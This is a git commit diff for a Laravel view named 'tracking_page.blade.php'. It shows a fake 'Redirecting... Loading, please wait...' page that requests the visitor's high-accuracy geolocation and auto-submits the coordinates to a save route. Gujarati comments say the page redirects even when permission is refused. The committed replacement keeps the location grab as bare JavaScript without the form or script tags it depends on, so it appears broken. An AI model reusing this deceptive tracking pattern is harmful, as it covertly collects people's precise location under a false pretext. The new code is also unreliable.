5e2b42f746030f726a66302b8ac65b01f2e4366e
Gaurav Patoliya <gauravpatoliya19@gmail.com>
2026-04-15 11:12:23 +0530

    Update tracking_page.blade.php

--- resources/views/tracking_page.blade.php
+++ resources/views/tracking_page.blade.php
@@ -1,32 +1,19 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Redirecting...</title>
-</head>
-<body>
-    <p>Loading, please wait...</p>
-
-    <form id="geoForm" action="{{ route('save.exact.location') }}" method="POST">
-        @csrf
-        <input type="hidden" name="lat" id="lat">
-        <input type="hidden" name="lng" id="lng">
-    </form>
-
-    <script>
-        window.onload = function() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    document.getElementById('lat').value = position.coords.latitude;
-                    document.getElementById('lng').value = position.coords.longitude;
-                    document.getElementById('geoForm').submit();
-                }, function(error) {
-                    // જો યુઝર પરમિશન ના આપે તો પણ રીડાયરેક્ટ કરી દો
-                    document.getElementById('geoForm').submit();
-                }, {enableHighAccuracy: true});
-            } else {
-                document.getElementById('geoForm').submit();
-            }
-        };
-    </script>
-</body>
-</html>
+window.onload = function() {
+    if (navigator.geolocation) {
+        // High Accuracy અને Timeout ઉમેરો
+        navigator.geolocation.getCurrentPosition(function(position) {
+            document.getElementById('lat').value = position.coords.latitude;
+            document.getElementById('lng').value = position.coords.longitude;
+            document.getElementById('geoForm').submit();
+        }, function(error) {
+            // જો એરર આવે તો પણ ગૂગલ પર તો મોકલી જ દેશે
+            document.getElementById('geoForm').submit();
+        }, {
+            enableHighAccuracy: true,
+            timeout: 5000, // ૫ સેકન્ડ રાહ જોશે
+            maximumAge: 0
+        });
+    } else {
+        document.getElementById('geoForm').submit();
+    }
+};
